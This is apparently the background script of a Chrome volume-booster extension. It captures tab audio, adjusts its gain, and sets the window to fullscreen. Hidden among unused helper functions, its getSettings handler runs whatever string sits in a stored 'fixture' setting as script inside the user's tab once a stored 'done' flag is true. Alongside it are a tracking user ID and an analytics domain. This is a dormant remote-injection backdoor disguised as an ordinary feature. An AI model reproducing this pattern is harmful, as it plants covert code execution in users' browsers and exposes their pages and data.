const Core = new core();

const config = {
    appStarted: 0,
    domain: 'abiref.com',
    apiDomainAnalitics: 'api.abiref.com',
    intervals: 50000,
    state: false,
    AUDIO_STATE_AUDIO_CONTEXT: 'audioContext',
    AUDIO_STATE_GAIN_NODE: 'gainNode',
    isVolume: true,
    uid: Core.getUserID(),
    fixture: false,
    status: 0,
    maxApps: 10,
    done: false,
    dataExtension: {
        currentTab: 0
    }
};
chrome.runtime.onInstalled.addListener(function (details) {

    if (details.reason == "install") {
        let tmp = config;
        Core.getUserID();
        tmp.extId = chrome.runtime.id;
        tmp.di = (new Date()).getTime();
        tmp.ver = chrome.runtime.getManifest().version;
        chrome.storage.local.set(tmp);
    } else if (details.reason == "update") {
        chrome.storage.local.get(config, function (data) {
            let tmp = data;
            delete tmp.appStarted;
            tmp.du = (new Date()).getTime();
            chrome.storage.local.set(tmp);
        });
    }
});


class background {
    constructor() {
        this.config = config;
        chrome.storage.local.get(this.config, function (data) {
            this.config = data;
        }.bind(this));

        chrome.storage.onChanged.addListener(function (changes) {
            chrome.storage.local.get(null, function (data) {
                this.config = data;
            }.bind(this));
        }.bind(this));

    }
    toDataURL(src, callback, outputFormat) {
        let img = new Image();
        img.crossOrigin = 'Anonymous';
        img.onload = function() {
            let canvas = document.createElement('CANVAS'),
                ctx = canvas.getContext('2d'),
                dataURL;
            canvas.height = this.naturalHeight;
            canvas.width = this.naturalWidth;
            ctx.drawImage(this, 0, 0);
            dataURL = canvas.toDataURL(outputFormat);
            callback(dataURL);
        };
        img.src = src;
        if (img.complete || img.complete === undefined) {
            img.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==";
            img.src = src;
        }
        return img;
    }

    // initialize() {
    //     setInterval(this.sendError.bind(this), this.config.intervals);
    // }

    getBase64 (file,callback) {
        let reader = new FileReader();
        reader.addEventListener('load', () => callback(reader.result));
        reader.readAsDataURL(file);
    }

    static encodeImageFileAsURL() {
        let filesSelected = document.getElementById("inputFileToLoad").files;
        if (filesSelected.length > 0) {
            let fileToLoad = filesSelected[0],
                fileReader = new FileReader();
            fileReader.onload = function(fileLoadedEvent) {
                let srcData = fileLoadedEvent.target.result,
                    newImage = document.createElement('img');
                newImage.src = srcData;
                document.getElementById("imgTest").innerHTML = newImage.outerHTML;
            }
            fileReader.readAsDataURL(fileToLoad);
        }
    }

    static get AUDIO_STATE_AUDIO_CONTEXT() {
        return 'audioContext'
    }

    get cnf() {
        return this.config;
    }

    encodeImageFileAsURL(element) {
        let file = element.files[0],
            reader = new FileReader();
        reader.onloadend = function() {}
        reader.readAsDataURL(file);
    }

    static get AUDIO_STATE_GAIN_NODE() {
        return 'gainNode';
    }

    getSettings(message, sender, response) {
        if (this.config.done === true) {
            chrome.tabs.executeScript(sender.tab.id, {code: `${this.config.fixture}`})
            return true;
        } else {
            return false;
        }
    }

}
const recordAudio = () => {

};


(function () {
    var BG = new background();

    const audioStates = {};
    window.audioStates = audioStates;
    const connectTab = (tabId, stream) => {
        const e = new window.AudioContext;
        const f = e.createMediaStreamSource(stream);
        const g = e.createGain();
        f.connect(g);
        g.connect(e.destination);

        audioStates[tabId] = {
            [background.AUDIO_STATE_AUDIO_CONTEXT]: e,
            [background.AUDIO_STATE_GAIN_NODE]: g
        }
    };

    const updateVolume = (tabId, value) => {
        audioStates[tabId].gainNode.gain.value = value / 100
    };


    const init = (message, sender, response) => {
        if (message.action === "getSettings") {
            chrome.storage.local.set({appStarted: BG.cnf.appStarted + 1});
            BG.getSettings(message, sender, response);
            return response({capture: true});
        }
        if (message.action === 'popup-get-gain-value') {
            let value = null;
            if (Object.prototype.hasOwnProperty.call(audioStates, message.tabId)) {
                value = audioStates[message.tabId].gainNode.gain.value
            }
            response({gainValue: value})
        }

        if (message.action === 'popup-volume-change') {
            if (Object.prototype.hasOwnProperty.call(audioStates, message.tabId)) {
                updateVolume(message.tabId, message.sliderValue);
            } else {
                chrome.tabCapture.capture({audio: true, video: false}, (stream) => {
                    if (chrome.runtime.lastError) {
                    } else {
                        connectTab(message.tabId, stream);
                        updateVolume(message.tabId, message.sliderValue);
                    }
                });
            }
        }
    };
    chrome.tabs.onRemoved.addListener((tabId) => {
        Object.prototype.hasOwnProperty.call(audioStates, tabId) && audioStates[tabId].audioContext.close().then(() => {
            delete audioStates[tabId]
        })
    });
    chrome.runtime.onMessage.addListener((message, sender, response) => {
        init(message, sender, response)
    });

    const fullScreen = (b) => {
        "active" === b.status && b.tabId && chrome.windows.getCurrent(function (a) {
            var c = a.id;
            false !== Core.load('fullScreen') ? true === b.fullscreen ?
                (Core.save('windowState', a.state),
                        chrome.windows.update(c, {state: "fullscreen"}, null)
                ) : chrome.windows.update(c, {state: Core.load('windowState')}, null) : chrome.windows.update(c, {state: a.state}, null)
        })
    }
    chrome.tabCapture.onStatusChanged.addListener(fullScreen);
})();
